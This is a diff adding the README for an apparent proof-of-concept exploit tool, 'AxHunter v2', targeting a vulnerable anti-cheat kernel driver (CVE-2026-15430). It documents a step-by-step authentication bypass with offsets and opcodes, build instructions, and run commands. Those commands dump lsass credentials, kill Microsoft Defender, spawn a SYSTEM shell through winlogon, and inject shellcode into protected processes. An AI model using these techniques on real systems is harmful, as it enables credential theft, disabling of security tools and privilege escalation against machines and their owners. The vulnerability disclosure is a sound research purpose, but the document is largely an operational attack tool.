@@ -1,0 +1,89 @@
+# AxHunter v2 — `xhunter2.sys` v2026.6.1.192 ([CVE-2026-15430](https://www.cve.org/CVERecord?id=CVE-2026-15430))
+
+PoC for Wellbia XIGNCODE3 `xhunter2.sys` v2026.6.1.192.
+
+**Companion write-up:** [Hunting the Hunter II](https://blacksnufkin.github.io/posts/Hunting-the-Hunter-II/).
+
+**CVE:** [CVE-2026-15430](https://www.cve.org/CVERecord?id=CVE-2026-15430).
+
+## Target
+
+```
+Driver       xhunter2.sys
+Version      2026.6.1.192
+Device       \Device\xhunter2  (DO_BUFFERED_IO, no \DosDevices\ symlink)
+Transport    IRP_MJ_WRITE, 1184-byte LCG-XOR-encrypted frame
+Dispatch     45 opcodes (774..822)
+```
+
+`xhunter2.sys` shipped in this folder is the exact sample used.
+
+## Three-layer authentication bypass
+
+**Layer 1 — WBMF at `IRP_MJ_CREATE`** (`sub_140002C80`). RSA-2048 verifies a Wellbia-signed blob at PE-relative offset `+0x290A0` inside a caller-supplied PE (pubkey hardcoded at `0x140014400`), then verifies the calling thread's `Win32StartAddress` lies inside that PE's range. Bypass: map `src/wbmf_module.dll` at its preferred base (`0x10000000`), install a 14-byte `FF 25 <abs64>` JMP trampoline inside the mapped region, start the worker thread on the trampoline.
+
+**Layer 2 — WBCC per request** (`sub_1400027F4` + `sub_1400029B8`). Validates a 536-byte blob at plaintext bytes `[48..584]` of every request, re-runs the WBMF RSA verify, then iterates a certificate chain. Bypass: `count = 0` in the WBCC blob — `sub_1400029B8` returns success immediately.
+
+**Layer 3 — PID flag gate** (`sub_140009688` + `sub_140009C40`). Requires `(flags & 0x80000008) == 0x80000008` for the caller's PID against a linked list at `qword_140025FD8`, keyed on `pid ^ 0x20241015`. Bypass:
+
+```
+cmd 777 (auth=1)  → flags = 0x80000000  (bit 31)
+cmd 779 (auth=0)  → flags = 0xC0000000  (side-effect ORs bit 30)
+cmd 775 (auth=1)  → flags = 0xC0000008  (bit 3 from attacker input)
+```
+
+## WBMF module
+
+`src/wbmf_module.dll` (176 KB) is Wellbia's signed WBMF module, extracted from a live `WindSlayer.exe` process via System Informer full dump and carved at VA `0x10000000` (0x2C000 bytes). It is not written to disk by Wellbia's install/runtime — the user-mode component injects it into every game client process at launch.
+
+Embedded via `include_bytes!` in `src/wbmf.rs` and mapped at runtime.
+
+## Build
+
+From the workspace root (`../`):
+
+```
+cargo build --release -p AxHunter_v2
+```
+
+Produces `../target/release/AxHunter_v2.exe`. Rust edition 2021. Release profile: `lto = true`, `panic = "abort"`. Depends on the shared [`axhunter-lsa`](../axhunter-lsa/) crate for LSA credential extraction (`dump` mode).
+
+## Run
+
+```
+AxHunter_v2.exe -m dump                          # credential dump from lsass.exe
+AxHunter_v2.exe -m kill -t <pid|image>           # e.g. -t MsMpEng.exe
+AxHunter_v2.exe -m lpe                           # SYSTEM shell via winlogon.exe
+AxHunter_v2.exe -m inject -t <pid|image>         # kernel-mode injection (default: WinExec shellcode)
+AxHunter_v2.exe -m inject -t winlogon.exe -p sc.bin  # inject custom payload
+AxHunter_v2.exe -m all                           # dump, then kill MsMpEng, then lpe
+AxHunter_v2.exe -m dump -d <service-name>        # override device path
+AxHunter_v2.exe -m dump -t <pid|image>           # override dump target
+```
+
+Device path defaults to `\Device\xhunter2`. Pass `-d <svc>` to point at a different service name if loading the driver yourself.
+
+Full CLI: `AxHunter_v2.exe --help`.
+
+## Modes
+
+- **`kill`** — cmd 785 handle on the target, cmd 791 (`ZwQueryInformationProcess(ProcessHandleInformation=51)`) for the target's handle table snapshot, cmd 800 (`KeStackAttachProcess` + `ObSetHandleAttributes(KernelMode)` + `ZwClose`) on each handle.
+- **`dump`** — cmd 785 handle on `lsass.exe`, cmd 787 (`KeStackAttachProcess` + byte copy) as the read primitive. LDR-walks the target, locates BCrypt 3DES key + IV in `lsasrv.dll`, walks `LogonSessionList`, decrypts NT/SHA1 hashes and WDigest plaintext.
+- **`lpe`** — cmd 785 handle on `winlogon.exe`, `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` running a 41-byte shellcode: `WinExec("cmd.exe /c start cmd.exe", SW_SHOW)`. Child inherits winlogon's `NT AUTHORITY\SYSTEM` token + Session 1.
+- **`inject`** — kernel-mode code injection via cmd 801 (init `RtlCreateUserThread` pointers) + cmd 785 (PPL handle) + cmd 820 (RWX alloc + copy + thread create, all ring 0). Injects into any process including PPL. Default payload: `WinExec("cmd.exe /c start cmd.exe")`. Use `-p <file.bin>` for custom shellcode.
+
+## Trampoline convention
+
+Each worker runs on its own trampoline slot inside the mapped WBMF PE:
+
+```
+pe + 0x500  → open_worker      (device open)
+pe + 0x520  → kill_worker      (mode: kill)
+pe + 0x540  → dump_worker      (mode: dump)
+pe + 0x560  → lpe_worker       (mode: lpe)
+pe + 0x580  → inject_worker    (mode: inject)
+```
+
+## Test environment
+
+Windows 11 24H2 build 26200. HVCI, VBS, Microsoft Vulnerable Driver Blocklist all enabled.
